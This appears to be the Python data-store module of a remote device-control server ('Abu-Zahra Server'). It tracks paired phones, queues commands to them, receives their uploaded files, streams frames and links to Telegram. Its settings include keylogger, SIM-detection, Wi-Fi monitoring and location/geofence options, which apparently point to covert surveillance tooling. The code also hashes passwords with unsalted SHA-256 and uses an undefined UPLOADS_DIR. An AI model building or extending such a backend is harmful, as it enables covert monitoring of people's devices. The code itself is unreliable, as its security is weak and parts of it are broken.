"""
Data Store Module - Central data management for Abu-Zahra Server.
Handles all in-memory data, JSON persistence, and user/device management.
Implements email-based account system with unique User IDs.
"""

import json
import os
import time
import uuid
import asyncio
import hashlib
from typing import Optional, Any, Dict, List
from datetime import datetime, timedelta

from .config import (
    DATA_DIR, PAIRING_CODE_LENGTH, PAIRING_CODE_CHARS,
    PAIRING_CODE_EXPIRE_SECONDS, MAX_EVENTS, MAX_LINK_CODES,
    DEVICE_OFFLINE_TIMEOUT, JWT_EXPIRE_HOURS, JWT_SECRET, ADMIN_EMAIL,
    ADMIN_USERNAME, ADMIN_PASSWORD
)

# ─── File Paths ───────────────────────────────────────────────
def _path(name: str) -> str:
    return os.path.join(DATA_DIR, name)

# ─── JSON File I/O ───────────────────────────────────────────
_json_lock = asyncio.Lock()

async def _load_json(name: str, default=None) -> Any:
    p = _path(name)
    if os.path.exists(p):
        try:
            with open(p, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            return default if default is not None else []
    return default if default is not None else []

async def _save_json(name: str, data: Any) -> None:
    async with _json_lock:
        p = _path(name)
        with open(p, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2, default=str)

# ─── In-Memory Stores ─────────────────────────────────────────
class DataStore:
    """Central data store for all server data."""
    
    def __init__(self):
        self.start_time = time.time()
        
        # Users: {user_id: {id, email, username, password_hash, role, created_at, devices[], settings, is_active}}
        self.users: Dict[str, dict] = {}
        
        # Sessions: {token: {user_id, username, role, created_at, expires_at, ip, user_agent}}
        self.sessions: Dict[str, dict] = {}
        
        # Devices: {device_id: {id, token, name, model, brand, os, battery, network, location, last_seen, created_at, owner_id, ...}}
        self.devices: Dict[str, dict] = {}
        
        # Commands: {command_id: {id, device_id, command, params, status, created_at, sent_at, result, completed_at, requested_by, source}}
        self.commands: Dict[str, dict] = {}
        self._command_counter = 0
        
        # Events: [{time, event, details, level, device_id, user_id}]
        self.events: List[dict] = []
        
        # Settings (global): {key: value}
        self.settings: dict = {
            "sync_interval": 15,
            "location_interval": 300,
            "auto_location": False,
            "auto_sync": True,
            "language": "ar",
            "notifications": True,
            "keylogger": False,
            "sim_detect": True,
            "wifi_monitor": False,
            "geofences": [],
        }
        
        # Pairing Codes: {code: {code, created_at, used, device_id, user_id, session_id, used_at, expires_at}}
        self.pairing_codes: Dict[str, dict] = {}
        
        # File tracking: {file_id: {id, device_id, filename, file_type, size, uploaded_at, expires_at, retrieved, command_id, caption}}
        self.files: Dict[str, dict] = {}
        
        # Rate limiting
        self._rate_counters: Dict[str, list] = {}
        self._last_link_code_time: float = 0
        self._device_last_online: Dict[str, bool] = {}
        self._device_battery_alert: Dict[str, float] = {}
        
        # Streaming
        self.stream_connections: Dict[str, dict] = {}
        self.latest_frames: Dict[str, dict] = {}
        self.jpeg_stream_tasks: Dict[str, asyncio.Task] = {}
        self.jpeg_stream_info: Dict[str, dict] = {}
        
        # Dashboard WebSocket clients
        self.dashboard_ws_clients: set = set()
        
        # Pending messages (for Telegram tracking)
        self.pending_messages: Dict[str, dict] = {}
        self.batch_operations: Dict[str, dict] = {}
        
        # Dedup sets
        self._processed_results: set = set()
        self._tg_processed_updates: set = set()
        self._tg_processed_messages: set = set()
        
        # IP to device mapping (for multipart uploads)
        self._ip_device_map: Dict[str, str] = {}
        
        # Telegram per-user sessions: {chat_id: {user_id, authenticated, devices[], selected_device, ...}}
        self.tg_sessions: Dict[str, dict] = {}
        
        # Stats
        self.api_hits = 0
        self.messages_sent = 0

    # ─── Persistence ──────────────────────────────────────────
    async def load_all(self):
        """Load all data from JSON files on startup."""
        self.devices = {d['id']: d for d in await _load_json("devices.json", [])}
        self.events = await _load_json("events.json", [])
        self.settings = await _load_json("settings.json", self.settings)
        self.pairing_codes = {c['code']: c for c in await _load_json("link_codes.json", [])}
        self.sessions = {s['token']: s for s in await _load_json("sessions.json", [])}
        self.users = {u['id']: u for u in await _load_json("users.json", [])}
        
        # Ensure admin user exists
        if not self.users:
            await self._create_admin_user()
        
        # Clean expired sessions
        await self.cleanup_expired_sessions()
        
        # Clean expired pairing codes
        await self.cleanup_expired_pairing_codes()
        
        # Initialize device online states
        for did, dev in self.devices.items():
            last = dev.get('last_seen', 0)
            online = (time.time() - last) < DEVICE_OFFLINE_TIMEOUT if last else False
            self._device_last_online[did] = online

    async def save_all(self):
        """Save all data to JSON files."""
        await asyncio.gather(
            _save_json("devices.json", list(self.devices.values())),
            _save_json("events.json", self.events[-MAX_EVENTS:]),
            _save_json("settings.json", self.settings),
            _save_json("link_codes.json", list(self.pairing_codes.values())[-MAX_LINK_CODES:]),
            _save_json("sessions.json", list(self.sessions.values())),
            _save_json("users.json", list(self.users.values())),
        )

    async def save_devices(self):
        await _save_json("devices.json", list(self.devices.values()))

    async def save_events(self):
        await _save_json("events.json", self.events[-MAX_EVENTS:])

    async def save_users(self):
        await _save_json("users.json", list(self.users.values()))

    async def save_sessions(self):
        await _save_json("sessions.json", list(self.sessions.values()))

    # ─── User Management (Email-based) ────────────────────────
    
    @staticmethod
    def _hash_password(password: str) -> str:
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def generate_user_id() -> str:
        return f"USR-{uuid.uuid4().hex[:12].upper()}"
    
    async def _create_admin_user(self):
        """Create default admin user on first run."""
        user_id = self.generate_user_id()
        self.users[user_id] = {
            "id": user_id,
            "email": ADMIN_EMAIL,
            "username": ADMIN_USERNAME,
            "password_hash": self._hash_password(ADMIN_PASSWORD),
            "role": "admin",
            "created_at": datetime.utcnow().isoformat(),
            "is_active": True,
            "devices": [],
            "settings": {},
            "permanent_link_code": self.generate_permanent_code(),
        }
        await self.save_users()
        await self.add_event("system", "Admin user created", "info")

    async def create_user(self, email: str, username: str, password: str, role: str = "user") -> dict:
        """Create a new user account. Returns user dict or raises ValueError."""
        email = email.lower().strip()
        
        # Check uniqueness
        for u in self.users.values():
            if u['email'] == email:
                raise ValueError("البريد الإلكتروني مسجل مسبقاً")
            if u['username'] == username:
                raise ValueError("اسم المستخدم مسجل مسبقاً")
        
        user_id = self.generate_user_id()
        user = {
            "id": user_id,
            "email": email,
            "username": username,
            "password_hash": self._hash_password(password),
            "role": role,
            "created_at": datetime.utcnow().isoformat(),
            "is_active": True,
            "devices": [],
            "settings": {},
            "permanent_link_code": self.generate_permanent_code(),
        }
        self.users[user_id] = user
        await self.save_users()
        await self.add_event("system", f"User created: {username} ({email})", "success")
        return user

    async def authenticate_user(self, username_or_email: str, password: str) -> Optional[dict]:
        """Authenticate user by username or email + password. Returns user dict or None."""
        username_or_email = username_or_email.strip().lower()
        password_hash = self._hash_password(password)
        
        for u in self.users.values():
            if (u['email'] == username_or_email or u['username'].lower() == username_or_email) and u['password_hash'] == password_hash:
                if not u.get('is_active', True):
                    return None
                return u
        return None

    async def get_user(self, user_id: str) -> Optional[dict]:
        return self.users.get(user_id)

    async def get_user_devices(self, user_id: str) -> List[dict]:
        """Get all devices owned by a user. Admin sees all."""
        user = self.users.get(user_id)
        if not user:
            return []
        if user.get('role') == 'admin':
            return list(self.devices.values())
        return [d for d in self.devices.values() if d.get('owner_id') == user_id]

    async def update_user(self, user_id: str, updates: dict) -> bool:
        user = self.users.get(user_id)
        if not user:
            return False
        for k, v in updates.items():
            if k == 'password':
                user['password_hash'] = self._hash_password(v)
            elif k in ('email', 'username', 'role', 'is_active', 'settings'):
                user[k] = v
        await self.save_users()
        return True

    async def delete_user(self, user_id: str) -> bool:
        if user_id not in self.users:
            return False
        del self.users[user_id]
        await self.save_users()
        return True

    async def list_users(self) -> List[dict]:
        return list(self.users.values())

    # ─── Permanent Link Codes ─────────────────────────────────

    def generate_permanent_code(self) -> str:
        import secrets as sec
        from .config import PAIRING_CODE_CHARS
        return ''.join(sec.choice(PAIRING_CODE_CHARS) for _ in range(8))

    async def get_or_create_permanent_code(self, user_id: str) -> str:
        user = self.users.get(user_id)
        if not user:
            return None
        if not user.get('permanent_link_code'):
            code = self.generate_permanent_code()
            user['permanent_link_code'] = code
            await self.save_users()
        return user['permanent_link_code']

    async def get_user_by_permanent_code(self, code: str) -> dict:
        for user in self.users.values():
            if user.get('permanent_link_code') == code:
                return user
        return None

    async def regenerate_permanent_code(self, user_id: str) -> str:
        user = self.users.get(user_id)
        if not user:
            return None
        code = self.generate_permanent_code()
        user['permanent_link_code'] = code
        await self.save_users()
        return code

    # ─── Session Management ───────────────────────────────────
    
    def create_session(self, user_id: str, username: str, role: str, ip: str = "", user_agent: str = "", source: str = "web") -> dict:
        token = secrets.token_hex(32)
        now = datetime.utcnow()
        session = {
            "token": token,
            "user_id": user_id,
            "username": username,
            "role": role,
            "created_at": now.isoformat(),
            "expires_at": (now + timedelta(hours=JWT_EXPIRE_HOURS)).isoformat(),
            "ip": ip,
            "user_agent": user_agent,
            "source": source,
        }
        self.sessions[token] = session
        return session

    def validate_session(self, token: str) -> Optional[dict]:
        session = self.sessions.get(token)
        if not session:
            return None
        try:
            expires = datetime.fromisoformat(session['expires_at'])
            # Ensure naive comparison (strip tz if present)
            if expires.tzinfo is not None:
                from datetime import timezone
                expires = expires.replace(tzinfo=None)
            if datetime.utcnow() > expires:
                del self.sessions[token]
                return None
        except (ValueError, KeyError):
            return None
        return session

    async def cleanup_expired_sessions(self):
        now = datetime.utcnow()
        to_remove = []
        for token, s in self.sessions.items():
            try:
                expires = datetime.fromisoformat(s['expires_at'])
                if expires.tzinfo is not None:
                    expires = expires.replace(tzinfo=None)
                if expires < now:
                    to_remove.append(token)
            except (ValueError, KeyError):
                to_remove.append(token)
        for t in to_remove:
            del self.sessions[t]
        if to_remove:
            await self.save_sessions()

    # ─── Device Management ────────────────────────────────────
    
    async def register_device(self, device_id: str, token: str, pairing_code: str,
                               model: str = "", brand: str = "", os_version: str = "",
                               user_id: str = None) -> Optional[dict]:
        """Register a device using a pairing code. Assigns to user who created the code."""
        code_data = self.pairing_codes.get(pairing_code)
        if not code_data:
            # Check if it's a permanent link code
            for user in self.users.values():
                if user.get('permanent_link_code') == pairing_code:
                    # Permanent code - always valid, assign to this user
                    code_data = {
                        'used': False,
                        'user_id': user['id'],
                        'code': pairing_code,
                        'expires_at': (datetime.utcnow() + timedelta(days=365*10)).isoformat(),  # Far future
                        'permanent': True,
                    }
                    break
        if not code_data:
            return None
        if code_data.get('used'):
            return None
        try:
            expires = datetime.fromisoformat(code_data['expires_at'])
            if datetime.utcnow() > expires:
                return None
        except (ValueError, KeyError):
            return None
        
        # Mark code as used
        code_data['used'] = True
        code_data['used_at'] = datetime.utcnow().isoformat()
        code_data['device_id'] = device_id
        
        # Determine owner
        owner_id = code_data.get('user_id') or user_id
        if not owner_id:
            # Assign to admin
            for u in self.users.values():
                if u.get('role') == 'admin':
                    owner_id = u['id']
                    break
        
        now = datetime.utcnow().isoformat()
        device = {
            "id": device_id,
            "token": token,
            "active": True,
            "name": model or "Unknown Device",
            "model": model,
            "brand": brand,
            "os": os_version,
            "battery": None,
            "network": None,
            "location": None,
            "last_seen": now,
            "created_at": now,
            "owner_id": owner_id,
            "ip": "",
            "settings": {},
        }
        self.devices[device_id] = device
        self._device_last_online[device_id] = True
        
        # Add to user's device list
        user = self.users.get(owner_id)
        if user and device_id not in user.get('devices', []):
            user.setdefault('devices', []).append(device_id)
        
        await self.save_devices()
        await self.save_users()
        await self.add_event("device", f"Device registered: {model} ({device_id})", "success", device_id=device_id)
        return device

    async def get_device(self, device_id: str) -> Optional[dict]:
        return self.devices.get(device_id)

    async def get_user_device(self, user_id: str, device_id: str) -> Optional[dict]:
        device = self.devices.get(device_id)
        if not device:
            return None
        user = self.users.get(user_id)
        if not user:
            return None
        if user.get('role') == 'admin' or device.get('owner_id') == user_id:
            return device
        return None

    async def update_device(self, device_id: str, updates: dict) -> bool:
        device = self.devices.get(device_id)
        if not device:
            return False
        device.update(updates)
        await self.save_devices()
        return True

    async def unlink_device(self, device_id: str, user_id: str) -> bool:
        device = self.devices.get(device_id)
        if not device:
            return False
        user = self.users.get(user_id)
        if not user or (user.get('role') != 'admin' and device.get('owner_id') != user_id):
            return False
        device['active'] = False
        # Remove from user's device list
        if device_id in user.get('devices', []):
            user['devices'].remove(device_id)
        await self.save_devices()
        await self.save_users()
        await self.add_event("device", f"Device unlinked: {device_id}", "warning", device_id=device_id)
        return True

    def get_device_token(self, device_id: str) -> Optional[str]:
        device = self.devices.get(device_id)
        return device['token'] if device else None

    def validate_device_token(self, device_id: str, token: str) -> bool:
        device = self.devices.get(device_id)
        return device is not None and device.get('token') == token and device.get('active', True)

    # ─── Pairing Code Management ──────────────────────────────
    
    def generate_pairing_code(self, user_id: str) -> dict:
        import secrets as sec
        code = ''.join(sec.choice(PAIRING_CODE_CHARS) for _ in range(PAIRING_CODE_LENGTH))
        now = datetime.utcnow()
        code_data = {
            "code": code,
            "created_at": now.isoformat(),
            "expires_at": (now + timedelta(seconds=PAIRING_CODE_EXPIRE_SECONDS)).isoformat(),
            "used": False,
            "device_id": None,
            "user_id": user_id,
            "session_id": str(uuid.uuid4()),
            "used_at": None,
        }
        self.pairing_codes[code] = code_data
        return code_data

    async def verify_pairing_code(self, code: str) -> Optional[dict]:
        code_data = self.pairing_codes.get(code)
        if not code_data:
            # Check if it's a permanent link code
            for user in self.users.values():
                if user.get('permanent_link_code') == code:
                    return {
                        'used': False,
                        'user_id': user['id'],
                        'code': code,
                        'expires_at': (datetime.utcnow() + timedelta(days=365*10)).isoformat(),
                        'permanent': True,
                    }
            return None
        if code_data.get('used'):
            return None
        try:
            expires = datetime.fromisoformat(code_data['expires_at'])
            if datetime.utcnow() > expires:
                return None
        except (ValueError, KeyError):
            return None
        return code_data

    async def cleanup_expired_pairing_codes(self):
        now = datetime.utcnow()
        to_remove = []
        for code, c in self.pairing_codes.items():
            if c.get('used'):
                continue
            try:
                expires = datetime.fromisoformat(c['expires_at'])
                if expires.tzinfo is not None:
                    expires = expires.replace(tzinfo=None)
                if expires < now:
                    to_remove.append(code)
            except (ValueError, KeyError):
                to_remove.append(code)
        for c in to_remove:
            del self.pairing_codes[c]
        if to_remove:
            await _save_json("link_codes.json", list(self.pairing_codes.values())[-MAX_LINK_CODES:])

    # ─── Command Management ───────────────────────────────────
    
    async def queue_command(self, device_id: str, command: str, params: dict = None,
                            requested_by: str = "", source: str = "web") -> dict:
        self._command_counter += 1
        cmd_id = f"cmd_{int(time.time()*1000)}_{self._command_counter}"
        now = datetime.utcnow().isoformat()
        cmd = {
            "id": cmd_id,
            "device_id": device_id,
            "command": command,
            "params": params or {},
            "status": "pending",
            "created_at": now,
            "sent_at": None,
            "result": None,
            "completed_at": None,
            "requested_by": requested_by,
            "source": source,
        }
        self.commands[cmd_id] = cmd
        # Also save pending commands to file for device polling
        await self._save_pending_commands(device_id)
        return cmd

    async def get_pending_commands(self, device_id: str) -> List[dict]:
        pending = [cmd for cmd in self.commands.values()
                   if cmd['device_id'] == device_id and cmd['status'] == 'pending']
        return pending

    async def update_command_result(self, command_id: str, status: str, result: Any = None) -> bool:
        cmd = self.commands.get(command_id)
        if not cmd:
            return False
        cmd['status'] = status
        cmd['result'] = result
        cmd['completed_at'] = datetime.utcnow().isoformat()
        return True

    async def _save_pending_commands(self, device_id: str):
        pending = [cmd for cmd in self.commands.values()
                   if cmd['device_id'] == device_id and cmd['status'] == 'pending']
        safe_id = "".join(c for c in device_id if c.isalnum() or c in '-_')
        await _save_json(f"pending_{safe_id}.json", pending)

    async def get_commands_history(self, device_id: str = None, limit: int = 100) -> List[dict]:
        cmds = list(self.commands.values())
        if device_id:
            cmds = [c for c in cmds if c['device_id'] == device_id]
        cmds.sort(key=lambda x: x.get('created_at', ''), reverse=True)
        return cmds[:limit]

    # ─── Event Management ─────────────────────────────────────
    
    async def add_event(self, category: str, event: str, level: str = "info",
                        device_id: str = None, user_id: str = None, details: str = ""):
        evt = {
            "time": datetime.utcnow().isoformat(),
            "event": event,
            "category": category,
            "level": level,
            "device_id": device_id or "",
            "user_id": user_id or "",
            "details": details,
        }
        self.events.append(evt)
        if len(self.events) > MAX_EVENTS * 1.5:
            self.events = self.events[-MAX_EVENTS:]
        # Don't save on every event (performance); periodic save handles it
        if len(self.events) % 10 == 0:
            await self.save_events()

    async def get_events(self, device_id: str = None, event_type: str = None, limit: int = 100) -> List[dict]:
        events = self.events
        if device_id:
            events = [e for e in events if e.get('device_id') == device_id]
        if event_type:
            events = [e for e in events if e.get('level') == event_type]
        return list(reversed(events[-limit:]))

    # ─── File Management (Temporary Storage) ──────────────────
    
    async def add_file(self, device_id: str, filename: str, file_type: str,
                       size: int, command_id: str = None, caption: str = "") -> dict:
        file_id = str(uuid.uuid4())
        now = datetime.utcnow()
        file_data = {
            "id": file_id,
            "device_id": device_id,
            "filename": filename,
            "file_type": file_type,
            "size": size,
            "uploaded_at": now.isoformat(),
            "expires_at": (now + timedelta(seconds=FILE_TEMP_EXPIRE_SECONDS)).isoformat(),
            "retrieved": False,
            "command_id": command_id,
            "caption": caption,
            "path": os.path.join(UPLOADS_DIR, f"{device_id}_{filename}"),
        }
        self.files[file_id] = file_data
        return file_data

    async def get_file(self, file_id: str) -> Optional[dict]:
        return self.files.get(file_id)

    async def mark_file_retrieved(self, file_id: str):
        f = self.files.get(file_id)
        if f:
            f['retrieved'] = True

    async def cleanup_expired_files(self):
        """Remove files that have expired or been retrieved."""
        now = datetime.utcnow()
        to_remove = []
        for fid, f in self.files.items():
            try:
                expires = datetime.fromisoformat(f['expires_at'])
                should_remove = (now > expires) or f.get('retrieved', False)
                if should_remove:
                    to_remove.append(fid)
                    # Delete actual file
                    path = f.get('path', '')
                    if path and os.path.exists(path):
                        try:
                            os.remove(path)
                        except OSError:
                            pass
            except (ValueError, KeyError):
                to_remove.append(fid)
        for fid in to_remove:
            del self.files[fid]

    # ─── Device Heartbeat & Status ────────────────────────────
    
    async def update_heartbeat(self, device_id: str, status: str, battery: int = None):
        device = self.devices.get(device_id)
        if not device:
            return
        now = datetime.utcnow().isoformat()
        device['last_seen'] = now
        if battery is not None:
            device['battery'] = battery
        
        was_offline = not self._device_last_online.get(device_id, False)
        is_online = status == "online"
        self._device_last_online[device_id] = is_online
        
        if was_offline and is_online:
            await self.add_event("connection", f"Device online: {device.get('name', device_id)}", "success", device_id=device_id)
        elif not was_offline and not is_online:
            await self.add_event("connection", f"Device offline: {device.get('name', device_id)}", "warning", device_id=device_id)

    async def check_device_online_status(self):
        """Background task: mark devices offline if no heartbeat."""
        now = time.time()
        for device_id, online in list(self._device_last_online.items()):
            if online:
                device = self.devices.get(device_id)
                if device:
                    try:
                        last_str = device.get('last_seen', '')
                        if not last_str:
                            continue
                        last_dt = datetime.fromisoformat(last_str)
                        if last_dt.tzinfo is not None:
                            last_dt = last_dt.replace(tzinfo=None)
                        last_ts = last_dt.timestamp()
                        if now - last_ts > DEVICE_OFFLINE_TIMEOUT:
                            self._device_last_online[device_id] = False
                            await self.add_event("connection", f"Device offline (timeout): {device.get('name', device_id)}", "warning", device_id=device_id)
                    except (ValueError, TypeError):
                        pass

    # ─── Rate Limiting ────────────────────────────────────────
    
    def check_rate_limit(self, key: str, max_count: int, window: float) -> bool:
        """Returns True if request is allowed, False if rate limited."""
        now = time.time()
        timestamps = self._rate_counters.setdefault(key, [])
        # Clean old entries
        timestamps[:] = [t for t in timestamps if now - t < window]
        if len(timestamps) >= max_count:
            return False
        timestamps.append(now)
        return True

    # ─── Statistics ───────────────────────────────────────────
    
    def get_stats(self) -> dict:
        total_devices = len(self.devices)
        online_devices = sum(1 for d in self.devices.values() if self._device_last_online.get(d['id'], False))
        pending_commands = sum(1 for c in self.commands.values() if c['status'] == 'pending')
        completed_commands = sum(1 for c in self.commands.values() if c['status'] == 'completed')
        total_commands = len(self.commands)
        total_users = len(self.users)
        
        return {
            "uptime": int(time.time() - self.start_time),
            "devices_total": total_devices,
            "devices_online": online_devices,
            "devices_offline": total_devices - online_devices,
            "commands_total": total_commands,
            "commands_pending": pending_commands,
            "commands_completed": completed_commands,
            "events_count": len(self.events),
            "users_total": total_users,
            "api_hits": self.api_hits,
            "messages_sent": self.messages_sent,
            "files_active": len(self.files),
            "version": VERSION,
        }

# ─── Global Instance ──────────────────────────────────────────
from .config import VERSION, FILE_TEMP_EXPIRE_SECONDS
import secrets

store = DataStore()